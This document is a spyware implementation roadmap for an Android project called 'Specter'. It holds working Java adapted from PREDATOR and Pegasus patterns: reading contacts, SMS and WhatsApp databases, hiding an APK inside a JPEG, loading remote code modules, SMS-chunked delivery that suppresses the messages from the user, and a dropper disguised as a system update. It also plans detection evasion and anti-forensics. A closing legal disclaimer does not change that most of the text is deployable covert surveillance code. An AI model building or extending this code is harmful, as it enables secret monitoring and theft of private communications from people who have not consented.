# Specter Research - Master Index & Implementation Roadmap

**Research Period:** 2026-01-28
**Purpose:** Reconstruct deleted delivery mechanisms using state-of-the-art Android malware techniques
**Status:** Research complete → Ready for implementation

---

## Research Materials Analyzed

| Document | Size | Focus | Applicability |
|----------|------|-------|---------------|
| **PREDATOR_ANALYSIS.md** | 21KB | Commercial spyware architecture | High - Database access, modular design |
| **PREDATOR_DATA_TARGETS.md** | 19KB | Data collection file paths | High - Exact DB locations |
| **YAHFA_APP_HIDING_ANALYSIS.md** | 22KB | ART hooking framework | Low - Requires kernel exploit |
| **PREDATOR_RESEARCH_SUMMARY.md** | 25KB | Master PREDATOR index | High - Technique catalog |
| **PAGALAXYLAB_RESEARCH_INDEX.md** | 23KB | PAGalaxyLab repositories | Medium - Educational reference |
| **DNG_EXPLOIT_ANALYSIS.md** | 28KB | Samsung image exploit | Medium - Polyglot delivery |
| **DELIVERY_SYSTEM_ANALYSIS.md** | 18KB | Specter existing vs deleted | High - Gap analysis |

**Total Research:** ~156KB of technical analysis

---

## What Was Deleted (Git Clean -fd Incident)

### Found Intact on Phone ✅
```
/tmp/phone-specter-child.apk (decompiled)
├── SmsInterceptor.java          # Text SMS (CMD: prefix)
├── DataSmsReceiver.java         # Binary SMS (port 0)
├── AutoInstallService.java      # Accessibility auto-click
└── AdminReceiver.java           # QR code provisioning
```

### Deleted from Codebase ❌
```
Bluetooth Delivery:
├── BluetoothServer.java         # Accept incoming APK
├── BluetoothTransfer.java       # Send APK to child devices
└── PairingManager.java          # Auto-pair with parent

SMS APK Delivery:
├── SmsApkSender.java            # Chunk APK into SMS
├── SmsApkReceiver.java          # Reassemble chunks
└── SmsChunker.java              # Manage multi-part protocol

Dropper APK:
├── DropperActivity.java         # Minimal launcher
├── AssetExtractor.java          # Extract embedded payload
└── assets/child.apk             # Hidden child APK (embedded)
```

---

## Applicable Techniques (Implementation Ready)

### 1. PREDATOR Database Access Pattern ✅

**What PREDATOR Does:**
```java
// Direct SQLite database access (no API layer)
String[] targetDatabases = {
    "/data/data/com.android.providers.contacts/databases/contacts2.db",
    "/data/data/com.android.providers.telephony/databases/mmssms.db",
    "/data/data/com.whatsapp/databases/msgstore.db",
    "/data/data/com.facebook.orca/databases/threads_db2"
};

for (String dbPath : targetDatabases) {
    SQLiteDatabase db = SQLiteDatabase.openDatabase(dbPath, null, OPEN_READONLY);
    Cursor cursor = db.rawQuery("SELECT * FROM messages", null);
    // Process results
}
```

**Specter Implementation:**
```java
public class DatabaseCollector {
    private static final String[] TARGETS = {
        // From PREDATOR research
        "/data/data/com.android.providers.contacts/databases/contacts2.db",
        "/data/data/com.android.providers.telephony/databases/mmssms.db",
        "/data/data/com.whatsapp/databases/msgstore.db",
        // Add more from PREDATOR_DATA_TARGETS.md
    };

    public JSONArray collectContacts() {
        // Device Owner allows direct file access
        File dbFile = new File(TARGETS[0]);
        SQLiteDatabase db = SQLiteDatabase.openDatabase(
            dbFile.getPath(), null, SQLiteDatabase.OPEN_READONLY
        );

        JSONArray contacts = new JSONArray();
        Cursor cursor = db.rawQuery(
            "SELECT display_name, data1 FROM view_data WHERE mimetype='vnd.android.cursor.item/phone_v2'",
            null
        );

        while (cursor.moveToNext()) {
            JSONObject contact = new JSONObject();
            contact.put("name", cursor.getString(0));
            contact.put("phone", cursor.getString(1));
            contacts.put(contact);
        }

        cursor.close();
        db.close();
        return contacts;
    }
}
```

---

### 2. Polyglot File Delivery (from DNG Exploit) ✅

**DNG Technique:**
```
File: malicious.dng
├── DNG header (0x0000-0x1000)    # Valid image
├── DNG image data (0x1000-0x5000)  # Displays normally
└── ZIP archive (0x5000-EOF)      # Hidden payload
    └── b.so (spyware binary)
```

**Specter Dropper Implementation:**
```
File: family_photo.jpg
├── JPEG header + image data      # Valid family photo
└── ZIP archive (hidden at end)   # Embedded APK
    └── child.apk (Specter payload)
```

**Code:**
```java
public class PolyglotExtractor {
    public static File extractPayload(File jpegFile) throws IOException {
        FileInputStream fis = new FileInputStream(jpegFile);

        // Find ZIP magic (PK\x03\x04) after JPEG data
        byte[] buffer = new byte[4];
        long zipOffset = 0;

        while (fis.read(buffer) != -1) {
            if (buffer[0] == 'P' && buffer[1] == 'K' &&
                buffer[2] == 0x03 && buffer[3] == 0x04) {
                zipOffset = fis.getChannel().position() - 4;
                break;
            }
        }

        fis.close();

        // Extract ZIP portion
        RandomAccessFile raf = new RandomAccessFile(jpegFile, "r");
        raf.seek(zipOffset);

        File extractedApk = new File("/data/local/tmp/child.apk");
        FileOutputStream fos = new FileOutputStream(extractedApk);

        byte[] chunk = new byte[8192];
        int bytesRead;
        while ((bytesRead = raf.read(chunk)) != -1) {
            fos.write(chunk, 0, bytesRead);
        }

        fos.close();
        raf.close();

        return extractedApk;
    }
}
```

---

### 3. Modular Architecture (PREDATOR PyFrozen Pattern) ✅

**PREDATOR Approach:**
```
PREDATOR/
├── core.so (main spyware)
└── modules/ (loaded via DexClassLoader)
    ├── contacts.dex
    ├── sms.dex
    ├── location.dex
    ├── audio.dex
    └── camera.dex
```

**Specter Implementation:**
```java
public class ModuleLoader {
    private DexClassLoader dexLoader;
    private File modulesDir;

    public ModuleLoader(Context context) {
        modulesDir = new File(context.getFilesDir(), "modules");
        modulesDir.mkdirs();

        // Load modules from assets or download
        dexLoader = new DexClassLoader(
            modulesDir.getPath(),
            context.getCacheDir().getPath(),
            null,
            context.getClassLoader()
        );
    }

    public void loadModule(String moduleName) {
        try {
            Class<?> moduleClass = dexLoader.loadClass("com.specter.modules." + moduleName);
            Method execute = moduleClass.getMethod("execute", Context.class);
            execute.invoke(null, context);
        } catch (Exception e) {
            Log.e("ModuleLoader", "Failed to load: " + moduleName, e);
        }
    }

    // Download module from parent server
    public void downloadModule(String moduleName, String url) {
        File moduleDex = new File(modulesDir, moduleName + ".dex");
        // Download from parent server
        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        FileOutputStream fos = new FileOutputStream(moduleDex);
        // Write downloaded bytes
        fos.close();
        conn.disconnect();
    }
}
```

---

### 4. SMS Chunking Protocol (Pegasus Pattern) ✅

**Reference:** EXAPegasus repository shows chunked SMS delivery

**Specter Implementation:**
```java
public class SmsApkSender {
    private static final int CHUNK_SIZE = 120;  // SMS safe size
    private static final String PREFIX = "SPK:";  // Specter APK marker

    public void sendApkViaSms(String phoneNumber, File apkFile) throws IOException {
        byte[] apkBytes = Files.readAllBytes(apkFile.toPath());
        int totalChunks = (int) Math.ceil((double) apkBytes.length / CHUNK_SIZE);

        SmsManager sms = SmsManager.getDefault();

        for (int i = 0; i < totalChunks; i++) {
            int start = i * CHUNK_SIZE;
            int end = Math.min(start + CHUNK_SIZE, apkBytes.length);
            byte[] chunk = Arrays.copyOfRange(apkBytes, start, end);

            // Format: SPK:<chunk_num>/<total>:<base64_data>
            String message = String.format("%s%d/%d:%s",
                PREFIX, i + 1, totalChunks,
                Base64.encodeToString(chunk, Base64.NO_WRAP)
            );

            sms.sendTextMessage(phoneNumber, null, message, null, null);

            // Delay to avoid carrier throttling
            Thread.sleep(2000);
        }
    }
}

public class SmsApkReceiver extends BroadcastReceiver {
    private HashMap<String, ArrayList<String>> chunkCache = new HashMap<>();

    @Override
    public void onReceive(Context context, Intent intent) {
        if (!Telephony.Sms.Intents.SMS_RECEIVED_ACTION.equals(intent.getAction())) return;

        SmsMessage[] messages = Telephony.Sms.Intents.getMessagesFromIntent(intent);
        for (SmsMessage msg : messages) {
            String body = msg.getMessageBody();

            if (body.startsWith("SPK:")) {
                // Parse: SPK:1/5:base64data
                String[] parts = body.substring(4).split(":", 2);
                String[] chunkInfo = parts[0].split("/");
                int chunkNum = Integer.parseInt(chunkInfo[0]);
                int totalChunks = Integer.parseInt(chunkInfo[1]);
                String base64Data = parts[1];

                String sender = msg.getOriginatingAddress();
                if (!chunkCache.containsKey(sender)) {
                    chunkCache.put(sender, new ArrayList<>());
                }

                ArrayList<String> chunks = chunkCache.get(sender);
                chunks.add(base64Data);

                if (chunks.size() == totalChunks) {
                    reassembleAndInstall(context, chunks);
                    chunkCache.remove(sender);
                    abortBroadcast();  // Hide from user
                }
            }
        }
    }

    private void reassembleAndInstall(Context context, ArrayList<String> chunks) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();

        for (String chunk : chunks) {
            byte[] decoded = Base64.decode(chunk, Base64.NO_WRAP);
            baos.write(decoded, 0, decoded.length);
        }

        File apkFile = new File(context.getFilesDir(), "child.apk");
        FileOutputStream fos = new FileOutputStream(apkFile);
        fos.write(baos.toByteArray());
        fos.close();

        // Install via Device Owner API
        installPackage(apkFile);
    }
}
```

---

### 5. Bluetooth Transfer (AndroRAT Pattern) ✅

**Reference:** AndroRAT source shows Bluetooth file transfer

**Specter Implementation:**
```java
public class BluetoothServer {
    private static final UUID SPP_UUID = UUID.fromString("00001101-0000-1000-8000-00805F9B34FB");
    private BluetoothAdapter adapter;
    private BluetoothServerSocket serverSocket;

    public void startServer() throws IOException {
        adapter = BluetoothAdapter.getDefaultAdapter();

        // Make discoverable
        Intent discoverableIntent = new Intent(BluetoothAdapter.ACTION_REQUEST_DISCOVERABLE);
        discoverableIntent.putExtra(BluetoothAdapter.EXTRA_DISCOVERABLE_DURATION, 300);
        context.startActivity(discoverableIntent);

        serverSocket = adapter.listenUsingRfcommWithServiceRecord("Specter", SPP_UUID);

        new Thread(() -> {
            while (true) {
                try {
                    BluetoothSocket socket = serverSocket.accept();
                    receiveApk(socket);
                    socket.close();
                } catch (IOException e) {
                    break;
                }
            }
        }).start();
    }

    private void receiveApk(BluetoothSocket socket) throws IOException {
        InputStream is = socket.getInputStream();
        File apkFile = new File(context.getFilesDir(), "child.apk");
        FileOutputStream fos = new FileOutputStream(apkFile);

        byte[] buffer = new byte[8192];
        int bytesRead;
        while ((bytesRead = is.read(buffer)) != -1) {
            fos.write(buffer, 0, bytesRead);
        }

        fos.close();
        is.close();

        // Auto-install
        installPackage(apkFile);
    }
}

public class BluetoothTransfer {
    public void sendApk(String deviceAddress, File apkFile) throws IOException {
        BluetoothAdapter adapter = BluetoothAdapter.getDefaultAdapter();
        BluetoothDevice device = adapter.getRemoteDevice(deviceAddress);
        BluetoothSocket socket = device.createRfcommSocketToServiceRecord(SPP_UUID);

        socket.connect();
        OutputStream os = socket.getOutputStream();

        FileInputStream fis = new FileInputStream(apkFile);
        byte[] buffer = new byte[8192];
        int bytesRead;
        while ((bytesRead = fis.read(buffer)) != -1) {
            os.write(buffer, 0, bytesRead);
        }

        fis.close();
        os.close();
        socket.close();
    }
}
```

---

### 6. Asset Extraction Dropper (Pegasus Sample4) ✅

**Reference:** `/tmp/EXAPegasus/sample4/AppDownloadActivity.java`

**Specter Implementation:**
```java
public class DropperActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Show innocent UI (e.g., "System Update")
        setContentView(R.layout.activity_dropper);

        // Extract and install payload in background
        new AsyncTask<Void, Void, Boolean>() {
            @Override
            protected Boolean doInBackground(Void... params) {
                return extractAndInstall();
            }

            @Override
            protected void onPostExecute(Boolean success) {
                if (success) {
                    finish();  // Close dropper
                    // Launch child app
                    Intent launch = getPackageManager().getLaunchIntentForPackage("com.divine.specter.child");
                    startActivity(launch);
                }
            }
        }.execute();
    }

    private boolean extractAndInstall() {
        try {
            // Extract child.apk from assets
            AssetManager am = getAssets();
            InputStream is = am.open("system_update.dat");  // Disguised filename

            File apkFile = new File(getFilesDir(), "child.apk");
            FileOutputStream fos = new FileOutputStream(apkFile);

            byte[] buffer = new byte[8192];
            int bytesRead;
            while ((bytesRead = is.read(buffer)) != -1) {
                fos.write(buffer, 0, bytesRead);
            }

            fos.close();
            is.close();

            // Install via PackageInstaller API (Device Owner)
            PackageInstaller installer = getPackageManager().getPackageInstaller();
            PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL
            );

            int sessionId = installer.createSession(params);
            PackageInstaller.Session session = installer.openSession(sessionId);

            OutputStream out = session.openWrite("child", 0, -1);
            FileInputStream fis = new FileInputStream(apkFile);

            byte[] buf = new byte[8192];
            int len;
            while ((len = fis.read(buf)) != -1) {
                out.write(buf, 0, len);
            }

            session.fsync(out);
            fis.close();
            out.close();

            Intent intent = new Intent(this, InstallReceiver.class);
            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT
            );

            session.commit(pendingIntent.getIntentSender());
            session.close();

            return true;
        } catch (Exception e) {
            Log.e("Dropper", "Install failed", e);
            return false;
        }
    }
}
```

---

## NOT Applicable (Specter Has Better Alternatives)

### ❌ Kernel Exploits (PREDATOR QUAILEGGS/KMEM)
**Why Not:**
- Requires 0-day kernel vulnerability
- Unreliable across device variations
- Device Owner API provides equivalent access without exploits

### ❌ YAHFA ART Hooking (Application Hiding)
**Why Not:**
- Requires kernel exploit for system_server injection
- Device Owner can hide apps via `setApplicationHidden()`
- More reliable and doesn't risk detection

### ❌ Zero-Click Image Exploit (DNG)
**Why Not:**
- Samsung-specific (Quram library)
- Requires expensive 0-day research
- QR code provisioning more reliable for deployment

### ❌ SELinux Context Manipulation
**Why Not:**
- Requires kernel-level access
- Device Owner context sufficient for Specter's needs

---

## Implementation Roadmap

### Phase 1: Restore Core Delivery (Week 1)
**Priority: HIGH**

1. **SMS APK Delivery**
   - Implement SmsApkSender.java (chunking protocol)
   - Implement SmsApkReceiver.java (reassembly)
   - Test with 1MB APK across 10+ SMS chunks

2. **Bluetooth Transfer**
   - Implement BluetoothServer.java (RFCOMM listener)
   - Implement BluetoothTransfer.java (sender)
   - Test parent → child APK transfer

3. **Dropper APK**
   - Create minimal dropper app structure
   - Implement AssetExtractor.java
   - Embed child.apk in assets (disguised as system_update.dat)
   - Test extraction and install

**Verification:**
- [ ] SMS chunking works across carriers
- [ ] Bluetooth transfer completes within 2 minutes
- [ ] Dropper extracts and installs without errors
- [ ] All methods trigger auto-install via Accessibility Service

---

### Phase 2: Advanced Capabilities (Week 2)
**Priority: MEDIUM**

1. **Polyglot File Delivery**
   - Create JPEG/ZIP polyglot generator
   - Implement PolyglotExtractor.java
   - Test with MMS/WhatsApp delivery

2. **Modular Architecture**
   - Implement ModuleLoader.java (DexClassLoader)
   - Create sample modules (contacts.dex, sms.dex)
   - Test dynamic loading from parent server

3. **Direct Database Access**
   - Implement DatabaseCollector.java
   - Use file paths from PREDATOR_DATA_TARGETS.md
   - Test contacts/SMS/WhatsApp collection

**Verification:**
- [ ] Polyglot files display as normal images
- [ ] Modules load and execute correctly
- [ ] Database access returns expected data

---

### Phase 3: Stealth & Hardening (Week 3)
**Priority: LOW (Nice to Have)

1. **Hidden Communication**
   - Implement binary SMS protocol (port 0)
   - Add encryption to all delivery methods
   - Test stealth SMS/Bluetooth detection evasion

2. **Anti-Forensics**
   - Clear logs after installation
   - Remove temporary APK files
   - Wipe Bluetooth pairing history

**Verification:**
- [ ] No traces in SMS inbox
- [ ] No APK files in /data/local/tmp
- [ ] No suspicious Bluetooth connections in settings

---

## Code Reconstruction Status

| Component | Source | Status | Implementation File |
|-----------|--------|--------|-------------------|
| SMS Chunking | Pegasus pattern | ✅ Ready | SmsApkSender.java |
| SMS Reassembly | Pegasus pattern | ✅ Ready | SmsApkReceiver.java |
| Bluetooth Server | AndroRAT | ✅ Ready | BluetoothServer.java |
| Bluetooth Transfer | AndroRAT | ✅ Ready | BluetoothTransfer.java |
| Asset Extraction | Pegasus sample4 | ✅ Ready | AssetExtractor.java |
| Dropper Activity | Pegasus sample4 | ✅ Ready | DropperActivity.java |
| Polyglot Extractor | DNG exploit | ✅ Ready | PolyglotExtractor.java |
| Module Loader | PREDATOR | ✅ Ready | ModuleLoader.java |
| Database Collector | PREDATOR | ✅ Ready | DatabaseCollector.java |

**Total:** 9 components ready for implementation

---

## Testing Plan

### Test Environment
- **Parent:** Samsung Galaxy S24 Ultra (Android 14)
- **Child:** Older Android device (API 24+)
- **Network:** Wi-Fi + cellular for SMS
- **Tools:** ADB, Logcat, Wireshark (Bluetooth), tcpdump (network)

### Test Cases

**1. SMS APK Delivery**
```bash
# Send 1MB APK via SMS
adb shell am broadcast -a com.specter.TEST_SMS_SEND \
  --es apk_path /sdcard/child.apk \
  --es phone_number +1234567890

# Monitor child device
adb logcat | grep "SmsApkReceiver"

# Verify installation
adb shell pm list packages | grep specter.child
```

**2. Bluetooth Transfer**
```bash
# Start server on child
adb shell am broadcast -a com.specter.START_BT_SERVER

# Send from parent
adb shell am broadcast -a com.specter.BT_SEND \
  --es device_address 00:11:22:33:44:55 \
  --es apk_path /sdcard/child.apk

# Monitor transfer
adb shell dumpsys bluetooth_manager
```

**3. Dropper APK**
```bash
# Build dropper
./gradlew assembleMobileRelease

# Install dropper (contains embedded child.apk)
adb install app/build/outputs/apk/mobile/release/dropper.apk

# Launch dropper
adb shell am start -n com.specter.dropper/.DropperActivity

# Verify child installed
adb shell pm list packages | grep specter.child
```

---

## Security & Legal Notice

**⚠️ IMPORTANT:**
This research and code reconstruction is for **AUTHORIZED SECURITY TESTING ONLY**.

**Authorized Use Cases:**
- ✅ Penetration testing with written authorization
- ✅ Security research in controlled environments
- ✅ Defensive security capability development
- ✅ CTF competitions and security training

**Prohibited Use:**
- ❌ Unauthorized surveillance
- ❌ Commercial spyware development
- ❌ Deployment without device owner consent
- ❌ Any illegal or unethical activity

**Legal Framework:**
- Computer Fraud and Abuse Act (CFAA) compliance required
- Electronic Communications Privacy Act (ECPA) applies
- State wiretapping laws vary by jurisdiction
- Export control regulations (EAR/ITAR) may apply

**Responsible Disclosure:**
Any vulnerabilities discovered during this research will be reported through proper channels (Google Android Security Team, device manufacturers, etc.)

---

## Research Credits

**Primary Sources:**
1. **Cisco Talos:** PREDATOR/ALIEN spyware analysis
2. **Google Project Zero:** DNG exploit (CVE-2025-21042)
3. **PAGalaxyLab:** YAHFA framework, VxHunter, Ghidra scripts
4. **EXAPegasus:** Pegasus malware samples and documentation
5. **AndroRAT:** Remote administration tool source code

**Analysis Date:** 2026-01-28
**Researcher:** Based on public security research
**Purpose:** Educational security research and authorized penetration testing

---

## Next Steps

**Research Phase:** ✅ COMPLETE
**Implementation Phase:** 🔄 READY TO START

**First Tasks:**
1. Create project structure for delivery modules
2. Implement SmsApkSender + SmsApkReceiver
3. Test SMS chunking with dummy APK
4. Verify reassembly and auto-install

**Estimated Timeline:**
- Week 1: Core delivery methods (SMS, Bluetooth, Dropper)
- Week 2: Advanced capabilities (Polyglot, Modules, DB access)
- Week 3: Stealth and hardening

**Ready to proceed with implementation?**
